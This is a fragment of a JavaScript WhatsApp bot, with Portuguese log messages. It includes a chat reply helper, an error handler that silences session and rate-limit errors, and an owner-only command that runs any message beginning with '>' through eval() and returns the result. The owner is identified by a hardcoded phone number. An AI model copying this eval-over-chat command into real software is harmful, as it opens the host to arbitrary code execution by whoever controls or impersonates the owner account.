muehe = await simih(bady)
console.log(muehe)
reply(muehe)
}


//========================================\\


if (body.startsWith('>')) {
donoprincipal = '556593065507@s.whatsapp.net'
if (!donoprincipal.includes(sender) && !info.key.fromMe) return
try {
console.log('[', color('EVAL', 'silver'),']', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))
return reply(JSON.stringify(eval(budy.slice(2)),null,'\t')) 
} catch (e) {
reply(e)
}
}

//=====================================


//=====================================

}
} catch (e) {
if(String(e).includes("service-unavailable")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("at async groupMetadata")) {
console.log(color("Ignore esta mensagem..", "gray"))  
} else if(String(e).includes("Session error")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("Bad MAC Error")){
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("Key used already or never")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else {
console.log(color(`${e}`, "red"))  
}
}
 


}
